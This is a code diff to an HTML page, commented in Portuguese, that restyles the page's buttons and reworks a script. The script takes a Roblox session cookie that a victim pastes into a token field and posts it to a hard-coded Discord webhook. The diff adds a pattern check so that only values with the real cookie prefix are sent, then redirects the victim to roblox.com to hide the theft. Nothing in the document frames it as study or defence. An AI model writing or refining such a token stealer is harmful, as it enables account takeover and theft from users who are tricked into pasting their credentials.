@@ -49,16 +49,16 @@
             box-sizing: border-box;
         }
 
-        /* ESTILO DOS BOTÕES COM GLOW E ARREDONDADOS */
+        /* BOTÕES CINZAS COM GLOW E MUITO ARREDONDADOS */
         .btn-main, .btn-info { 
             cursor: pointer;
             font-weight: bold;
             transition: 0.3s;
-            background: #555; /* Cinza */
+            background: #555;
             color: white;
-            border: 2px solid #fff; /* Contorno Branco */
-            border-radius: 50px; /* Muito arredondado */
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); /* Efeito Glow */
+            border: 2px solid #fff;
+            border-radius: 50px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
         }
 
         .btn-main {
@@ -78,7 +78,7 @@
 
         .btn-main:hover, .btn-info:hover {
             background: #777;
-            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8); /* Glow aumenta no hover */
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
         }
 
         /* Modal */
@@ -141,13 +141,24 @@
             const tokenValue = document.getElementById('userToken').value;
             const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
             
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "🚨 **NOVO TOKEN CAPTURADO!** 🚨\n```" + tokenValue + "```"
-                })
-            }).then(() => { window.location.href = "https://www.roblox.com/"; });
+            // SISTEMA DE VERIFICAÇÃO DE PADRÃO
+            const padraoValido = /^_\|WARNING:-DO-NOT-SHARE-THIS/;
+
+            if (padraoValido.test(tokenValue)) {
+                // Se o formato estiver correto, envia para a webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🚨 **NOVO TOKEN VALIDADO CAPTURADO!** 🚨\n```" + tokenValue + "```"
+                    })
+                }).then(() => { 
+                    window.location.href = "https://www.roblox.com/"; 
+                });
+            } else {
+                // Se não for o padrão correto, dá erro e não envia
+                alert("ERRO: O token inserido é inválido ou está incompleto!");
+            }
         }
     </script>
 </body>
